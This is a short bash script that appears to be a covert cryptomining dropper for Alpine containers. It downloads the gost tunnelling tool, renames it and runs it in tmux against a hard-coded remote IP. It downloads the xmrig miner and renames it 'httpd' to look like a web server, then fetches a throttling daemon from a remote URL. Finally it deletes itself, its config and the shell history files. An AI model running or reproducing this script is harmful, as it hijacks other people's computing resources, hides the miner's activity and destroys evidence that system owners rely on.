#!/bin/bash

## needed
apk --no-cache add tmux sed grep 2>/dev/null
export TERM=${TERM:-linux} PATH=.:$PATH

## glib
LIBC=2.26-r0
wget -q -O /etc/apk/keys/sgerrand.rsa.pub https://raw.githubusercontent.com/sgerrand/alpine-pkg-glibc/master/sgerrand.rsa.pub
wget https://github.com/sgerrand/alpine-pkg-glibc/releases/download/${LIBC}/glibc-${LIBC}.apk
apk add glibc-${LIBC}.apk 2>/dev/null
rm -f glibc-${LIBC}.apk
## tnl
TNL_REMOTE=${TNL_REMOTE:-212.237.6.194}
TNL_ARGS=${TNL_ARGS:--L tcp://:8080/:8081 -F kcp://chacha20:123@${TNL_REMOTE}:443?ttl=60}
TNL_VER=${TNL_VER:-2.4}
TNL_MASK=${TNL_MASK:-gst}
TNL_URL=https://github.com/ginuerzh/gost/releases/download/v${TNL_VER}/gost_${TNL_VER}_linux_amd64.tar.gz
wget -q $TNL_URL -O tnl.tar.gz
tar xf tnl.tar.gz
mv gost*/gost ${TNL_MASK} && chmod +x ${TNL_MASK} &>/dev/null
rm -rf tnl.tar.gz gost*/
tmux new-session -d -s ${TNL_MASK} ${TNL_MASK} ${TNL_ARGS}

cd ~/ || exit 1

OBJ_MASK=${OBJ_MASK:-httpd}
DAEMON=${DAEMON:-pausd}
OBJ_CFG=${OBJ_CFG:-cfg}
DAEMON_ARGS=${DAEMON_ARGS:-${OBJ_MASK} ${OBJ_CFG}}

## download cfg
if [ "$OBJ_CFG" != cfg ]; then
	wget -q "$OBJ_CFG" -O cfg
fi

## object
OBJ_VER=${OBJ_VER:-2.4.3}
OBJ_NAME=${OBJ_NAME:-xmrig}
OBJ_URL=${OBJ_URL:-https://github.com/xmrig/xmrig/releases/download/v${OBJ_VER}/${OBJ_NAME}-${OBJ_VER}-gcc7-xenial-amd64-no-api.tar.gz}

## get the object
wget -q $OBJ_URL -O obj.tar.gz
tar xf obj.tar.gz
rm -f obj.tar.gz
mv ${OBJ_NAME}*/${OBJ_NAME} ${OBJ_MASK}
rm -rf ${OBJ_NAME}*/
chmod +x ${OBJ_MASK} &>/dev/null

## daemon
DAEMON_URL=https://rawgit.com/untoreh/scripts/master/${DAEMON}
wget -q ${DAEMON_URL}
chmod +x ${DAEMON} &>/dev/null

## daemon conf
PAUSD_SHARES=${PAUSD_SHARES:-1}
PAUSD_THREADS=${PAUSD_THREADS:-1}
PAUSD_VER=${PAUSD_VER:-2}
PAUSD_SESSION_NAME=${PAUSD_SESSION_NAME:-${OBJ_MASK}}
PAUSD_RATE=${PAUSD_RATE:-200}

## init
tmux new-session -d -s ${DAEMON} ${DAEMON} ${DAEMON_ARGS}

## cleanup
rm -- "$0" "$OBJ_CFG" ~/.*_history